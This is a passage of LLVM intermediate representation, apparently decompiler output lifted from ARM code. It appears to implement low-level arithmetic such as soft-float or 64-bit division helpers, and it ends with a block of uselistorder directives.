  %v1_1dd2045 = phi i32 [ %v1_1dd20, %.thread4 ], [ %v6_1dd20, %bb97 ]
  %v1_1dd3c = phi i32 [ %v1_1dd3c49, %.thread4 ], [ %v6_1dd20, %bb97 ]
  %v0_1dd30 = phi i32 [ %v0_1dd14, %.thread4 ], [ %v7_1dd14, %bb97 ]
  %v1_1dd34 = phi i32 [ %v1_1dd18, %.thread4 ], [ %v3_1dd18, %bb97 ]
  %v1_1dd24 = urem i32 %v3_1dd08, 2
  %v2_1dd24 = icmp ne i32 %v1_1dd24, 0
  %v3_1dd24 = udiv i32 %v5_1dd7417, 4
  %v3_1dd28 = zext i1 %v2_1dd24 to i32
  %v6_1dd28 = and i64 %v14_1dd0c, 4294967295
  %v7_1dd28 = sub i32 33, %v15_1dd0c
  %v8_1dd28 = zext i32 %v7_1dd28 to i64
  %v9_1dd28 = shl i64 %v6_1dd28, %v8_1dd28
  %v10_1dd28 = sub i32 32, %v15_1dd0c
  %v11_1dd28 = shl i32 %v3_1dd28, %v10_1dd28
  %v12_1dd28 = zext i32 %v11_1dd28 to i64
  %v14_1dd28 = or i64 %v12_1dd28, %v9_1dd28
  %v15_1dd28 = trunc i64 %v14_1dd28 to i32
  %v3_1dd2c = icmp uge i32 %v1_1dd34, %v15_1dd28
  %v3_1dd30 = icmp eq i1 %v3_1dd2c, false
  %v4_1dd30 = sub i32 %v0_1dd30, %v3_1dd24
  %v6_1dd30 = sext i1 %v3_1dd30 to i32
  %v7_1dd30 = add i32 %v6_1dd30, %v4_1dd30
  %v13_1dd30 = icmp ult i32 %v0_1dd30, %v3_1dd24
  %v14_1dd30 = or i1 %v13_1dd30, %v3_1dd30
  br i1 %v14_1dd30, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_1dd34 = sub i32 %v1_1dd34, %v15_1dd28
  store i32 %v3_1dd34, i32* %r6.global-to-local, align 4
  store i32 %v7_1dd30, i32* %r5.global-to-local, align 4
  %v5_1dd3c = udiv i32 %v0_1dd7c, 4
  %v6_1dd3c = or i32 %v1_1dd3c, %v5_1dd3c
  store i32 %v6_1dd3c, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_1dd58 = phi i32 [ %v1_1dd5857, %.thread6 ], [ %v6_1dd3c, %bb98 ]
  %v1_1dd0433 = phi i32 [ %v1_1dd0434, %.thread6 ], [ %v6_1dd3c, %bb98 ]
  %v1_1dd2044 = phi i32 [ %v1_1dd2045, %.thread6 ], [ %v6_1dd3c, %bb98 ]
  %v1_1dd3c53 = phi i32 [ %v1_1dd3c, %.thread6 ], [ %v6_1dd3c, %bb98 ]
  %v0_1dd4c = phi i32 [ %v0_1dd30, %.thread6 ], [ %v7_1dd30, %bb98 ]
  %v1_1dd50 = phi i32 [ %v1_1dd34, %.thread6 ], [ %v3_1dd34, %bb98 ]
  %v1_1dd40 = urem i32 %v3_1dd24, 2
  %v2_1dd40 = icmp ne i32 %v1_1dd40, 0
  %v3_1dd40 = udiv i32 %v5_1dd7417, 8
  %v3_1dd44 = zext i1 %v2_1dd40 to i32
  %v6_1dd44 = and i64 %v14_1dd28, 4294967295
  %v7_1dd44 = sub i32 33, %v15_1dd28
  %v8_1dd44 = zext i32 %v7_1dd44 to i64
  %v9_1dd44 = shl i64 %v6_1dd44, %v8_1dd44
  %v10_1dd44 = sub i32 32, %v15_1dd28
  %v11_1dd44 = shl i32 %v3_1dd44, %v10_1dd44
  %v12_1dd44 = zext i32 %v11_1dd44 to i64
  %v14_1dd44 = or i64 %v12_1dd44, %v9_1dd44
  %v15_1dd44 = trunc i64 %v14_1dd44 to i32
  %v3_1dd48 = icmp uge i32 %v1_1dd50, %v15_1dd44
  %v3_1dd4c = icmp eq i1 %v3_1dd48, false
  %v4_1dd4c = sub i32 %v0_1dd4c, %v3_1dd40
  %v6_1dd4c = sext i1 %v3_1dd4c to i32
  %v7_1dd4c = add i32 %v6_1dd4c, %v4_1dd4c
  %v13_1dd4c = icmp ult i32 %v0_1dd4c, %v3_1dd40
  %v14_1dd4c = or i1 %v13_1dd4c, %v3_1dd4c
  br i1 %v14_1dd4c, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_1dd50 = sub i32 %v1_1dd50, %v15_1dd44
  store i32 %v3_1dd50, i32* %r6.global-to-local, align 4
  store i32 %v7_1dd4c, i32* %r5.global-to-local, align 4
  %v5_1dd58 = udiv i32 %v0_1dd7c, 8
  %v6_1dd58 = or i32 %v1_1dd58, %v5_1dd58
  store i32 %v6_1dd58, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_1dd68 = phi i32 [ %v1_1dd50, %.thread8 ], [ %v3_1dd50, %bb100 ]
  %v0_1dd64 = phi i32 [ %v0_1dd4c, %.thread8 ], [ %v7_1dd4c, %bb100 ]
  %v2_1dda0 = phi i32 [ %v1_1dd58, %.thread8 ], [ %v6_1dd58, %bb100 ]
  %v1_1dd0432 = phi i32 [ %v1_1dd0433, %.thread8 ], [ %v6_1dd58, %bb100 ]
  %v1_1dd2043 = phi i32 [ %v1_1dd2044, %.thread8 ], [ %v6_1dd58, %bb100 ]
  %v1_1dd3c52 = phi i32 [ %v1_1dd3c53, %.thread8 ], [ %v6_1dd58, %bb100 ]
  %v2_1dd5c = or i32 %v0_1dd64, %v1_1dd68
  %v4_1dd5c = icmp eq i32 %v2_1dd5c, 0
  br i1 %v4_1dd5c, label %dec_label_pc_1dd9c, label %dec_label_pc_1dd64

dec_label_pc_1dd64:                               ; preds = %.thread10
  %v3_1dd64 = mul i32 %v0_1dd64, 16
  %v4_1dd68 = udiv i32 %v1_1dd68, 268435456
  %v5_1dd68 = or i32 %v3_1dd64, %v4_1dd68
  store i32 %v5_1dd68, i32* %r5.global-to-local, align 4
  %v3_1dd6c = mul i32 %v1_1dd68, 16
  store i32 %v3_1dd6c, i32* %r6.global-to-local, align 4
  %v3_1dd70 = mul nuw i32 %v3_1dd40, 8
  %v4_1dd74 = udiv i32 %v15_1dd44, 536870912
  %v5_1dd74 = or i32 %v4_1dd74, %v3_1dd70
  %v3_1dd78 = mul i32 %v15_1dd44, 8
  %v3_1dd7c = udiv i32 %v0_1dd7c, 16
  store i32 %v3_1dd7c, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1dd7c, 16
  br i1 %tmp, label %dec_label_pc_1dd84, label %dec_label_pc_1dcf4

dec_label_pc_1dd84:                               ; preds = %dec_label_pc_1dd64
  %v1_1dd84 = and i32 %v1_1dda0.ph, 1048576
  %v2_1dd84 = icmp eq i32 %v1_1dd84, 0
  br i1 %v2_1dd84, label %dec_label_pc_1dd8c, label %.thread11.loopexit

dec_label_pc_1dd8c:                               ; preds = %dec_label_pc_1dd84
  %v2_1dd8c = or i32 %v2_1dda0, %v1_1dda0.ph
  store i32 %v2_1dd8c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1dcf4.outer

dec_label_pc_1dd9c:                               ; preds = %.thread10
  store i32 %v15_1dd44, i32* %r2.global-to-local, align 4
  store i32 %v3_1dd40, i32* %r3.global-to-local, align 4
  %v1_1dd9c = and i32 %v1_1dda0.ph, 1048576
  %v2_1dd9c = icmp eq i32 %v1_1dd9c, 0
  br i1 %v2_1dd9c, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_1dd9c
  %v3_1dda0 = or i32 %v2_1dda0, %v1_1dda0.ph
  store i32 %v3_1dda0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_1dd84
  store i32 %v3_1dd78, i32* %r2.global-to-local, align 4
  store i32 %v5_1dd74, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_1dd9c, %bb101
  %v1_1dda8 = add nsw i32 %v4_1dcc8, 515
  store i32 %v1_1dda8, i32* %ip.global-to-local, align 4
  %v2_1dda8 = icmp ugt i32 %v1_1dccc, 252
  %v7_1dda8 = icmp eq i32 %v1_1dccc, 253
  %v2_1ddac = xor i1 %v7_1dda8, true
  %v3_1ddac = and i1 %v2_1dda8, %v2_1ddac
  br i1 %v3_1ddac, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_1ddac = icmp ugt i32 %v1_1dda8, 1791
  %v11_1ddac = icmp eq i32 %v1_1dda8, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_1ddb0 = phi i1 [ %v7_1dda8, %.thread11 ], [ %v11_1ddac, %bb102 ]
  %v0_1ddb0 = phi i1 [ %v2_1dda8, %.thread11 ], [ %v6_1ddac, %bb102 ]
  %v2_1ddb0 = xor i1 %v1_1ddb0, true
  %v3_1ddb0 = and i1 %v0_1ddb0, %v2_1ddb0
  call void @__pseudo_cond_branch(i1 %v3_1ddb0, i32 ptrtoint (i32* @global_var_1dac4.1218 to i32))
  %v0_1ddb4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ddb4 = load i32, i32* %r3.global-to-local, align 4
  %v2_1ddb4 = sub i32 %v0_1ddb4, %v1_1ddb4
  store i32 %v2_1ddb4, i32* %ip.global-to-local, align 4
  %v3_1ddb4 = icmp uge i32 %v0_1ddb4, %v1_1ddb4
  %v9_1ddb4 = icmp eq i32 %v0_1ddb4, %v1_1ddb4
  br i1 %v9_1ddb4, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_1ddb8 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ddb8 = load i32, i32* %r2.global-to-local, align 4
  %v3_1ddb8 = sub i32 %v1_1ddb8, %v2_1ddb8
  store i32 %v3_1ddb8, i32* %ip.global-to-local, align 4
  %v4_1ddb8 = icmp uge i32 %v1_1ddb8, %v2_1ddb8
  %v10_1ddb8 = icmp eq i32 %v1_1ddb8, %v2_1ddb8
  br i1 %v10_1ddb8, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_1ddbc = load i32, i32* %r0.global-to-local, align 4
  %v2_1ddbc = urem i32 %v1_1ddbc, 2
  %v3_1ddbc = icmp ne i32 %v2_1ddbc, 0
  %v4_1ddbc = udiv i32 %v1_1ddbc, 2
  store i32 %v4_1ddbc, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_1ddc0 = phi i1 [ %v3_1ddb4, %bb103 ], [ %v4_1ddb8, %bb104 ], [ %v3_1ddbc, %bb105 ]
  %v0_1ddc0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1ddc0 = zext i1 %v1_1ddc0 to i32
  %v3_1ddc0 = add i32 %v2_1ddc0, %v0_1ddc0
  store i32 %v3_1ddc0, i32* %r0.global-to-local, align 4
  %v0_1ddc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ddc4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1ddc4 = and i32 %v1_1ddc4, 4096
  %v3_1ddc4 = icmp ne i32 %v2_1ddc4, 0
  %v4_1ddc4 = mul i32 %v1_1ddc4, 1048576
  %v6_1ddc4 = add i32 %v4_1ddc4, %v0_1ddc4
  %v7_1ddc4 = zext i1 %v3_1ddc4 to i32
  %v8_1ddc4 = add i32 %v7_1ddc4, %v6_1ddc4
  store i32 %v8_1ddc4, i32* %r1.global-to-local, align 4
  %v2_1ddc8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1ddc8, i32* %r4.global-to-local, align 4
  store i32 %v6_1dc68, i32* %r5.global-to-local, align 4
  store i32 %v9_1dc68, i32* %r6.global-to-local, align 4
  ret i32 %v3_1ddc0

dec_label_pc_1ddd0:                               ; preds = %dec_label_pc_1dc88
  %v1_1ddd0 = and i32 %v2_1dc8c, -2147483648
  %v4_1ddd4 = urem i32 %v1_1dc74, 1048576
  %v5_1ddd4 = or i32 %v1_1ddd0, %v4_1ddd4
  store i32 %v5_1ddd4, i32* %r1.global-to-local, align 4
  %v6_1ddd8 = add nsw i32 %v2_1dc88, 1023
  store i32 %v6_1ddd8, i32* %r4.global-to-local, align 4
  %v8_1ddd8 = sub nsw i32 0, %v2_1dc88
  %v9_1ddd8 = and i32 %v6_1ddd8, %v8_1ddd8
  %v11_1ddd8 = icmp slt i32 %v2_1dc88, -1023
  %v12_1ddd8 = icmp eq i32 %v6_1ddd8, 0
  %v7_1dddc = icmp sgt i32 %v2_1dc88, -1023
  br i1 %v7_1dddc, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_1ddd0
  %v10_1dddc = sub nsw i32 1024, %v2_1dc88
  store i32 %v10_1dddc, i32* %r5.global-to-local, align 4
  %v14_1dddc = and i32 %v10_1dddc, %v6_1ddd8
  %v16_1dddc = icmp slt i32 %v10_1dddc, 0
  %v17_1dddc = icmp eq i32 %v6_1ddd8, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_1ddd0, %bb106
  %v3_1dde8.in = phi i32 [ %v9_1ddd8, %dec_label_pc_1ddd0 ], [ %v14_1dddc, %bb106 ]
  %v2_1dde8 = phi i1 [ %v11_1ddd8, %dec_label_pc_1ddd0 ], [ %v16_1dddc, %bb106 ]
  %v1_1dde8 = phi i1 [ %v12_1ddd8, %dec_label_pc_1ddd0 ], [ %v17_1dddc, %bb106 ]
  %v3_1dde8 = icmp slt i32 %v3_1dde8.in, 0
  %v3_1dde0 = xor i1 %v3_1dde8, %v2_1dde8
  %v4_1dde0 = or i1 %v1_1dde8, %v3_1dde0
  br i1 %v4_1dde0, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_1dde084 = mul i32 %v6_1ddd8, 1048576
  %v10_1dde085 = or i32 %v9_1dde084, %v5_1ddd4
  store i32 %v10_1dde085, i32* %r1.global-to-local, align 4
  store i32 %v3_1dc68, i32* %r4.global-to-local, align 4
  store i32 %v6_1dc68, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_1dde8 = phi i32 [ %v12_1dc68, %bb108 ], [ %v1_1ddd0, %bb107 ]
  %v6_1dde8 = xor i1 %v4_1dde0, true
  call void @__pseudo_cond_branch(i1 %v6_1dde8, i32 %v0_1dde8)
  %v0_1ddec = load i32, i32* %r1.global-to-local, align 4
  %v1_1ddec = or i32 %v0_1ddec, 1048576
  store i32 %v1_1ddec, i32* @r1, align 4
  %v0_1ddf4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1ddf4 = add i32 %v0_1ddf4, -1
  store i32 %v1_1ddf4, i32* @r4, align 4
  %v3_1ddf4 = sub i32 0, %v0_1ddf4
  %v4_1ddf4 = and i32 %v0_1ddf4, %v3_1ddf4
  %v5_1ddf4 = icmp slt i32 %v4_1ddf4, 0
  store i1 %v5_1ddf4, i1* @cpsr_v, align 1
  %v6_1ddf4 = icmp slt i32 %v1_1ddf4, 0
  store i1 %v6_1ddf4, i1* @cpsr_n, align 1
  %v7_1ddf4 = icmp eq i32 %v0_1ddf4, 1
  store i1 %v7_1ddf4, i1* @cpsr_z, align 1
  %v0_1ddf8 = call i32 @function_1dac4()
  store i32 %v0_1ddf8, i32* @r0, align 4
  %v0_1de00 = call i32 @function_1dac4()
  store i32 %v0_1de00, i32* @r0, align 4
  %v0_1de04.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1de08.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1de04

dec_label_pc_1de04:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_1de04.pre-phi = phi i32 [ %v5_1dc78, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_1dc78, %bb91 ], [ %v5_1dc78, %.thread ]
  %v0_1de08 = phi i32 [ %v5_1dc74, %.thread1 ], [ %v5_1dc74, %.thread2 ], [ %v5_1dc74, %bb91 ], [ %v0_1de08.pre, %.thread ]
  %v2_1de0c = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_1de04.pre, %.thread ]
  %v5_1de04 = and i32 %v2_1de0c, %v4_1de04.pre-phi
  store i32 %v5_1de04, i32* @r5, align 4
  %v4_1de08 = icmp eq i32 %v2_1de0c, %v0_1de08
  br i1 %v4_1de08, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_1de04
  %v5_1de0c = icmp eq i32 %v5_1de04, %v2_1de0c
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_1de04, %bb109
  %v0_1de10 = phi i1 [ false, %dec_label_pc_1de04 ], [ %v5_1de0c, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_1de10, i32 ptrtoint (i32* @global_var_1dc58.1220 to i32))
  %v0_1de14 = load i32, i32* @r4, align 4
  %v1_1de14 = load i32, i32* %ip.global-to-local, align 4
  %v4_1de14 = icmp eq i32 %v1_1de14, %v0_1de14
  br i1 %v4_1de14, label %dec_label_pc_1de1c, label %dec_label_pc_1de38

dec_label_pc_1de1c:                               ; preds = %bb110
  %v0_1de1c = load i32, i32* @r0, align 4
  %v1_1de1c = load i32, i32* @r1, align 4
  %v4_1de1c = mul i32 %v1_1de1c, 4096
  %v5_1de1c = or i32 %v4_1de1c, %v0_1de1c
  store i32 %v5_1de1c, i32* %r4.global-to-local, align 4
  %v1_1de20 = icmp ne i32 %v5_1de1c, 0
  call void @__pseudo_cond_branch(i1 %v1_1de20, i32 ptrtoint (i32* @global_var_1dc58.1220 to i32))
  %v0_1de24 = load i32, i32* @r5, align 4
  %v1_1de24 = load i32, i32* %ip.global-to-local, align 4
  %v1_1de28 = icmp ne i32 %v1_1de24, %v0_1de24
  call void @__pseudo_cond_branch(i1 %v1_1de28, i32 ptrtoint (i32* @global_var_1dc3c.1221 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1de34 = call i32 @function_1dc58(i32 %arg3, i32 %arg4)
  store i32 %v2_1de34, i32* @r0, align 4
  %v1_1de38.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1de38

dec_label_pc_1de38:                               ; preds = %bb110, %dec_label_pc_1de1c
  %v1_1de38 = phi i32 [ %v1_1de14, %bb110 ], [ %v1_1de38.pre, %dec_label_pc_1de1c ]
  %v0_1de38 = load i32, i32* @r5, align 4
  %v4_1de38 = icmp eq i32 %v0_1de38, %v1_1de38
  br i1 %v4_1de38, label %dec_label_pc_1de40, label %dec_label_pc_1de38.dec_label_pc_1de54_crit_edge

dec_label_pc_1de38.dec_label_pc_1de54_crit_edge:  ; preds = %dec_label_pc_1de38
  %v0_1de54.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1de54

dec_label_pc_1de40:                               ; preds = %dec_label_pc_1de38
  %v4_1de40 = mul i32 %arg4, 4096
  %v5_1de40 = or i32 %v4_1de40, %arg3
  store i32 %v5_1de40, i32* %r5.global-to-local, align 4
  %v7_1de40 = icmp eq i32 %v5_1de40, 0
  call void @__pseudo_cond_branch(i1 %v7_1de40, i32 ptrtoint (i32* @global_var_1dbec.1222 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1de50 = call i32 @function_1dc58(i32 %arg3, i32 %arg4)
  store i32 %v2_1de50, i32* @r0, align 4
  br label %dec_label_pc_1de54

dec_label_pc_1de54:                               ; preds = %dec_label_pc_1de38.dec_label_pc_1de54_crit_edge, %dec_label_pc_1de40
  %v0_1de54 = phi i32 [ %v0_1de54.pre, %dec_label_pc_1de38.dec_label_pc_1de54_crit_edge ], [ %v2_1de50, %dec_label_pc_1de40 ]
  %v1_1de54 = load i32, i32* @r1, align 4
  %v3_1de54 = mul i32 %v1_1de54, 2
  %v4_1de54 = or i32 %v3_1de54, %v0_1de54
  store i32 %v4_1de54, i32* %r6.global-to-local, align 4
  %v6_1de54 = icmp eq i32 %v4_1de54, 0
  br i1 %v6_1de54, label %dec_label_pc_1de54._crit_edge, label %bb111

dec_label_pc_1de54._crit_edge:                    ; preds = %dec_label_pc_1de54
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_1de54
  %v4_1de58 = mul i32 %arg4, 2
  %v5_1de58 = or i32 %v4_1de58, %arg3
  store i32 %v5_1de58, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_1de58, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_1de54._crit_edge, %bb111
  %v4_1de68.pre-phi = phi i32 [ %.pre80, %dec_label_pc_1de54._crit_edge ], [ %v5_1de58, %bb111 ]
  %v0_1de5c = phi i1 [ false, %dec_label_pc_1de54._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_1de5c, i32 ptrtoint (i32* @global_var_1db84.1223 to i32))
  %v0_1de60 = load i32, i32* @r0, align 4
  %v1_1de60 = load i32, i32* @r1, align 4
  %v3_1de60 = mul i32 %v1_1de60, 2
  %v4_1de60 = or i32 %v3_1de60, %v0_1de60
  store i32 %v4_1de60, i32* %r4.global-to-local, align 4
  %v1_1de64 = icmp ne i32 %v4_1de60, 0
  call void @__pseudo_cond_branch(i1 %v1_1de64, i32 ptrtoint (i32* @global_var_1dc3c.1221 to i32))
  store i32 %v4_1de68.pre-phi, i32* %r5.global-to-local, align 4
  %v1_1de6c = icmp ne i32 %v4_1de68.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_1de6c, i32 ptrtoint (i32* @global_var_1dbec.1222 to i32))
  %v0_1de70 = load i32, i32* @r0, align 4
  %v1_1de70 = load i32, i32* @r1, align 4
  %v2_1de70 = call i32 @function_1dc58(i32 %v0_1de70, i32 %v1_1de70)
  store i32 %v2_1de70, i32* %r0.global-to-local, align 4
  ret i32 %v2_1de70

; uselistorder directives
  uselistorder i32 %v5_1de58, { 1, 0, 2 }
  uselistorder i32 %v1_1de14, { 1, 0 }
  uselistorder i32 %v1_1ddf4, { 1, 0 }
  uselistorder i32 %v0_1ddf4, { 3, 1, 0, 2 }
  uselistorder i32 %v10_1dddc, { 2, 0, 1 }
  uselistorder i32 %v6_1ddd8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1ddd0, { 1, 0 }
  uselistorder i32 %v2_1ddb8, { 1, 0, 2 }
  uselistorder i32 %v1_1ddb8, { 1, 0, 2 }
  uselistorder i32 %v1_1ddb4, { 1, 0, 2 }
  uselistorder i32 %v0_1ddb4, { 1, 0, 2 }
  uselistorder i1 %v7_1dda8, { 1, 0 }
  uselistorder i32 %v2_1dd8c, { 1, 0 }
  uselistorder i32 %v3_1dd78, { 2, 1, 0 }
  uselistorder i32 %v3_1dd6c, { 0, 2, 1 }
  uselistorder i32 %v5_1dd68, { 2, 0, 1 }
  uselistorder i32 %v6_1dd58, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1dd44, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1dd40, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1dd4c, { 0, 2, 1 }
  uselistorder i32 %v1_1dd58, { 1, 0 }
  uselistorder i32 %v6_1dd3c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1dd28, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1dd24, { 0, 2, 1 }
  uselistorder i32 %v0_1dd30, { 0, 2, 1 }
  uselistorder i32 %v1_1dd3c, { 1, 0 }
  uselistorder i32 %v6_1dd20, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1dd0c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1dd14, { 0, 2, 1 }
  uselistorder i32 %v1_1dd20, { 1, 0 }
  uselistorder i32 %v3_1dd04, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1dcf8, { 1, 2, 0 }
  uselistorder i32 %v3_1dd7813, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1dd7417, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1dcf8, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1dd04, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1dda0.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1dce4, { 1, 0 }
  uselistorder i32 %v0_1dce8, { 1, 0 }
  uselistorder i32 %v3_1dcd4, { 1, 0 }
  uselistorder i1 %v1_1dcc8, { 1, 0 }
  uselistorder i32 %v3_1dcb8, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1dcb4, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1dcac, { 2, 1, 0 }
  uselistorder i32 %v5_1dca8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1dc88, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_1dc78, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1dc78, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_1dc74, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_1dc74, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_1dc68, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 9, 10, 0, 6, 1, 2, 3, 4, 5, 7, 8 }
  uselistorder i32* %r5.global-to-local, { 13, 14, 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 8, 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 9, 10, 1, 0, 2, 3, 6, 4, 5, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 6, 0, 7, 8, 1, 2, 3, 4, 5, 9 }
  uselistorder i32* %ip.global-to-local, { 8, 6, 7, 5, 0, 1, 2, 3, 4, 10, 9 }
  uselistorder i32 (i32, i32)* @function_1dc58, { 2, 1, 0 }
  uselistorder i32 ()* @function_1dac4, { 1, 0 }
  uselistorder i1* @cpsr_n, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 1024, { 3, 0, 9, 1, 10, 4, 11, 2, 12, 13, 14, 6, 7, 8, 5 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 16, { 1, 9, 7, 8, 10, 11, 26, 12, 13, 2, 14, 15, 30, 131, 132, 139, 141, 16, 142, 17, 145, 146, 43, 147, 149, 166, 167, 168, 32, 31, 44, 169, 18, 170, 171, 154, 155, 108, 109, 45, 93, 94, 95, 96, 143, 144, 89, 90, 91, 92, 140, 3, 46, 172, 173, 174, 175, 37, 38, 39, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 156, 160, 161, 133, 47, 134, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 157, 40, 121, 135, 136, 48, 49, 137, 138, 97, 98, 50, 99, 51, 52, 53, 33, 148, 41, 100, 178, 101, 54, 55, 56, 57, 58, 60, 61, 150, 151, 152, 153, 62, 181, 182, 0, 183, 184, 59, 63, 164, 28, 162, 163, 5, 4, 34, 64, 65, 66, 67, 68, 69, 122, 123, 124, 125, 126, 127, 85, 158, 159, 102, 70, 71, 165, 19, 72, 73, 20, 27, 21, 22, 6, 23, 24, 35, 74, 75, 103, 104, 105, 106, 107, 76, 128, 77, 42, 78, 129, 79, 86, 87, 80, 88, 130, 29, 36, 81, 176, 177, 179, 82, 180, 25, 83, 84 }
  uselistorder i32 8, { 0, 1, 2, 3, 4, 5, 64, 65, 33, 6, 7, 22, 8, 133, 134, 141, 143, 144, 145, 146, 9, 147, 149, 150, 151, 152, 153, 34, 74, 50, 51, 66, 162, 163, 164, 165, 29, 93, 75, 76, 77, 78, 148, 142, 180, 181, 187, 236, 42, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 166, 94, 95, 96, 97, 98, 99, 100, 101, 102, 10, 43, 103, 40, 104, 105, 67, 106, 107, 167, 168, 169, 135, 136, 137, 138, 139, 140, 79, 80, 81, 82, 52, 254, 255, 35, 83, 11, 131, 183, 84, 85, 31, 188, 189, 190, 191, 192, 193, 194, 195, 12, 56, 196, 197, 198, 199, 200, 201, 202, 203, 13, 154, 155, 156, 157, 158, 159, 160, 161, 204, 205, 206, 207, 14, 208, 209, 15, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 227, 220, 221, 222, 223, 57, 24, 224, 225, 226, 58, 59, 16, 228, 229, 230, 231, 233, 234, 60, 17, 235, 18, 232, 175, 46, 47, 44, 45, 25, 26, 37, 38, 48, 256, 174, 170, 171, 108, 109, 68, 110, 111, 112, 113, 30, 114, 61, 62, 115, 116, 117, 49, 118, 119, 120, 121, 27, 28, 122, 123, 124, 63, 172, 173, 86, 176, 32, 177, 178, 179, 53, 69, 36, 19, 20, 23, 21, 87, 88, 89, 90, 91, 54, 92, 125, 126, 55, 127, 128, 129, 130, 70, 71, 72, 73, 41, 39, 132, 182, 184, 185, 186 }
